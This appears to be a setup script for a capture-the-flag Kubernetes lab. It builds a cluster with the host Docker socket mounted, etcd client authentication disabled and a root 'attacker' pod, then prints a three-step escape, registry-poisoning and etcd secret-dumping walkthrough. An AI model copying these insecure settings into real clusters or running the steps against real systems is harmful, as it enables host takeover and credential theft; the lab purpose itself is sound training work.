#!/bin/bash
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
CLUSTER_NAME="cve-chain-docker-etcd"

echo "[Chain Docker-to-etcd] 3-step K8s attack chain"
echo "  K8S-17 (Docker Socket) -> K8S-09 (Registry Poison) -> K8S-08 (etcd)"

# Prepare flags
FLAG_DIR="/home/kianabin/cve-flags/chain22"
mkdir -p "$FLAG_DIR"
FLAG1="${CVE_FLAG_1:-flag{chain22-step1-docker}}"
FLAG2="${CVE_FLAG_2:-flag{chain22-step2-registry}}"
FLAG3="${CVE_FLAG_3:-flag{chain22-step3-etcd}}"
echo "$FLAG1" > "$FLAG_DIR/step1.txt"
echo "[*] Chain flags:"
echo "  Step 1: $FLAG1"
echo "  Step 2: $FLAG2"
echo "  Step 3: $FLAG3"

echo "[*] Creating unified KIND cluster with Docker socket + etcd..."
kind create cluster --name "$CLUSTER_NAME" --config - << 'KINDCFG'
kind: Cluster
apiVersion: kind.x-k8s.io/v1alpha4
nodes:
  - role: control-plane
    image: kindest/node:v1.27.3
    extraPortMappings:
      - containerPort: 2379
        hostPort: 11379
        protocol: TCP
      - containerPort: 5000
        hostPort: 11500
        protocol: TCP
    extraMounts:
      - hostPath: /var/run/docker.sock
        containerPath: /var/run/docker.sock
      - hostPath: /home/kianabin/cve-flags/chain22
        containerPath: /host-flag
    kubeadmConfigPatches:
      - |
        kind: ClusterConfiguration
        etcd:
          local:
            extraArgs:
              client-cert-auth: "false"

KINDCFG

echo "[*] Waiting for cluster stabilization..."
kubectl wait --for=condition=Ready pods --all -n kube-system --timeout=120s 2>/dev/null || true
sleep 10

# Stage 2: Secret for registry poisoning step
kubectl create secret generic chain22-stage2 \
  --from-literal=flag="$FLAG2" \
  -n default 2>/dev/null || true

# Stage 3: Flag in etcd
kubectl create secret generic chain22-final \
  --from-literal=flag="$FLAG3" \
  -n kube-system 2>/dev/null || true

# Start local registry for step 2
echo "[*] Starting private registry for step 2..."
docker run -d --name chain22-registry \
  --network host \
  -e REGISTRY_HTTP_ADDR=0.0.0.0:11500 \
  registry:2 2>/dev/null || echo "  Registry already running"

# Deploy Docker socket pod
echo "[*] Deploying Docker socket pod..."
kubectl apply -f - << YAML
apiVersion: v1
kind: Pod
metadata:
  name: chain22-pod
  namespace: default
spec:
  containers:
    - name: attacker
      image: docker:cli
      imagePullPolicy: IfNotPresent
      command: ["sleep", "3600"]
      securityContext:
        runAsUser: 0
      volumeMounts:
        - name: docker-sock
          mountPath: /var/run/docker.sock
        - name: host-flag
          mountPath: /host-flag
  volumes:
    - name: docker-sock
      hostPath:
        path: /var/run/docker.sock
        type: Socket
    - name: host-flag
      hostPath:
        path: /host-flag
        type: Directory
YAML

echo "[*] Waiting for pod readiness..."
kubectl wait --for=condition=Ready pod/chain22-pod --timeout=60s 2>/dev/null || true
sleep 5

echo ""
echo "[Chain Docker-to-etcd] Ready"
echo "  Step 1: kubectl exec -it chain22-pod -- sh"
echo "    -> docker run --rm -v /host-flag:/mnt alpine cat /mnt/step1.txt"
echo "  Step 2: docker tag alpine:latest localhost:11500/evil:latest && docker push"
echo "  Step 3: etcdctl --endpoints=http://localhost:11379 get /registry/secrets/kube-system/chain22-final"
